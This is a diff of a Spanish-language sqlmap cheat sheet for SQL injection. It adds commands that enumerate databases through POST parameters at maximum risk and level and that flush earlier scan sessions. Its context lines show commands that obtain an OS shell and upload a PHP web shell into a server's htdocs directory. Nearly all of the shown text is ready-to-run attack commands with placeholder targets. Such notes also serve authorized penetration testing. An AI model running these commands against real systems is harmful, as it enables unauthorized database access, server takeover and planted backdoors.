@@ -65,6 +65,11 @@ sqlmap -u "<URL>" --cookie="<Cookie-Value>" --os-shell
 sqlmap -u '<URL>' -p User-Agent --method=GET --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --tamper=space2comment --dbs
 ```
 
+#### Listar BD usando el método POST
+```
+sqlmap -u '<URL>' -p User-Agent --method=POST --data 'db=mysql&name=taco&sort=id&order=asc' -p 'name,sort,order' --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --dbs
+```
+
 #### Colocar un parámetro y usar la técnica de UNION
 ```
 sqlmap -u "<URL>" -p <PARAMETER> --technique=U
@@ -109,6 +114,11 @@ sqlmap -u "<URL>" -p <PARAMETER> --threads=2 --level=3 --risk=2 --no-cast -A "NO
 #### Cargar una shell en el servidor
 ```
 sqlmap -u "<URL>" -p <PARAMETER> --threads=2 --level=3 --risk=2 --no-cast -A "NONE" --file-write=/root/Desktop/shell.php --file-dest=/xampp/htdocs/shell.php --batch
+```
+
+#### Ignorar cualquier sesión previa (si se trata del mismo sitio) para que realice otro escaneo
+```
+sqlmap -u "<URL>" --cookie="<Cookie-Value>" --dbs --flush-session
 ```
 
 #### Usar en formulario de Login cargado desde un archivo, para enviar datos en POST y usando la técnica BLIND, para obtener el nombre de la BD
